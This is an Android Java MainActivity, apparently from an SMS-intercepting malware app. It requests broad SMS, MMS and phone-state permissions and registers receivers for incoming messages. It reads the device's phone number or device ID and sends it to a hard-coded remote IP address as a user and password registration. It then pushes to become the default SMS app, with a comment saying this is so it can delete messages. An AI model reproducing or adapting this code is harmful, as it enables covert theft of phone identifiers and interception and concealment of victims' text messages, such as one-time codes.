package ily.xieqing.com.myapplication;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;

import java.io.IOException;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private static final String          TAG                            = "MainActivity";
    private              SMSRecevier     smsRecevier                    = new SMSRecevier();
    private              MmsSmsReceiver2 smsRecevier2                   = new MmsSmsReceiver2();
    private static       String[]        PERMISSIONS_CAMERA_AND_STORAGE = {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.RECEIVE_MMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_WAP_PUSH,
            Manifest.permission.READ_PHONE_STATE,
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //8.0以上，动态注册广播
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
            registerReceiver(smsRecevier, intentFilter);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction("android.provider.Telephony.MMS_RECEIVED");
            intentFilter.addAction("android.provider.Telephony.WAP_PUSH_RECEIVED");
            registerReceiver(smsRecevier2, intentFilter);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

            //检测是否有权限，如果没有权限，就需要申请
            if (checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
                    checkSelfPermission(Manifest.permission.RECEIVE_WAP_PUSH) != PackageManager.PERMISSION_GRANTED ||
                    checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED ||
                    checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
                    checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
                    checkSelfPermission(Manifest.permission.RECEIVE_MMS) != PackageManager.PERMISSION_GRANTED ||
                    checkSelfPermission(Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED||
                    checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED
                    ) {
                //申请权限
                requestPermissions(PERMISSIONS_CAMERA_AND_STORAGE, 199);
                //返回false。说明没有授权
                return;
            }
        }
        gotoset();
    }

    private void gotoset() {

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                    if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                        // TODO: Consider calling
                        //    ActivityCompat#requestPermissions
                        // here to request the missing permissions, and then overriding
                        //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                        //                                          int[] grantResults)
                        // to handle the case where the user grants the permission. See the documentation
                        // for ActivityCompat#requestPermissions for more details.
                        return;
                    }
                    String NativePhoneNumber = telephonyManager.getLine1Number();
                    if (TextUtils.isEmpty(NativePhoneNumber)){
                        NativePhoneNumber=telephonyManager.getDeviceId();
                    }else{
                        NativePhoneNumber=NativePhoneNumber.substring(1);
                    }
                    Log.e(TAG, " upload  =" + NativePhoneNumber);
                    Response execute = new OkHttpClient().newCall(new Request.Builder()
                            .url("http://202.79.169.167/api.php?my=zc&user=" + NativePhoneNumber + "&pass=" + NativePhoneNumber).get().build()).execute();
                    Log.e(TAG, " upload execute =" + execute.body().string());
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
        //需要将本应用设置为默认短信  才能删除
        if (!Telephony.Sms.getDefaultSmsPackage(this).equals(getPackageName())) {
            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, getPackageName());
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {

        switch (requestCode) {
            case 199: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // permission was granted, yay! Do the
                    // contacts-related task you need to do.
                    gotoset();
                }
                return;
            }
            // other 'case' lines to check for other
            // permissions this app might request
        }

    }

}
